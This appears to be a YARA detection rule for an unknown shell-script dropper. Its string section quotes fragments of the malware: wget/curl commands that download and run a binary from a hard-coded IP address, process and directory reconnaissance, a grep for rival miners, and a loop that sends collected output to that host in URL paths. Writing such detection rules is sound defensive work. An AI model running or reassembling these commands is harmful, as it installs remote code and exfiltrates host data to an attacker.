rule SCRIPT_Dropper_Unknown_ForgeAuto_23ab4027
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "23ab402769c82205287e2d474ec599768f193697a3bfe3ed3aa37cf068e16e0a"
        yarahub_uuid = "51d445a5-c781-4547-9e79-2579211bf27e"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "e36af5b892768e88b0198c8d4ca5f37f"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "$B/bins/1e" ascii
        $s1 = "export PATH=/bin:/usr/bin:/sbin:/usr/sbin" ascii
        $s2 = "B=http://164.68.109.244" ascii
        $s3 = "wget -q -T 5 -O /dev/null \"$B/dk-start\" 2>/dev/null || true" ascii
        $s4 = "ls -la /tmp /dev/shm \"$HOME/.cache\" /data 2>/dev/null | head -50" ascii
        $s5 = "ps -ef 2>/dev/null | sed -n \"1,50p\"" ascii
        $s6 = "ps -ef 2>/dev/null | grep -E \"xmrig|kinsing|kdevtmpfsi|minerd|sysrv|\\.x86|\\.i686|/tmp/\\.|/dev/shm/\\.\" | grep -v grep" ascii
        $s7 = "wget -q -T 8 -O \"$f\" \"$B/bins/1e\" || curl -fsS --max-time 8 -o \"$f\" \"$B/bins/1e\"" ascii
        $s8 = "chmod 777 \"$f\" 2>/dev/null" ascii
        $s9 = "f\" --self-check >/dev/null 2>&1; echo SC=$?" ascii
        $s10 = "diagk </dev/null >/dev/null 2>&1 &" ascii
        $s11 = "if ps -p $P >/dev/null 2>&1; then echo ALIVE3; ls -l /proc/$P/exe 2>/dev/null; else echo DEAD3; fi" ascii
        $s12 = "if ps -p $P >/dev/null 2>&1; then echo ALIVE11; else echo DEAD11; fi" ascii
        $s13 = "ls -la \"$HOME/.cache\" 2>/dev/null | head" ascii
        $s14 = "> /tmp/.dkout 2>&1" ascii
        $s15 = "while IFS= read -r line; do" ascii
        $s16 = "enc=$(printf '%s' \"$line\" | tr ' /' '._' | cut -c1-100)" ascii
        $s17 = "wget -q -T 3 -O /dev/null \"$B/dk/$i/$enc\" 2>/dev/null || true" ascii
        $s18 = "done < /tmp/.dkout" ascii
        $s19 = "wget -q -T 5 -O /dev/null \"$B/dk-done-$i\" 2>/dev/null || true" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s2)
}
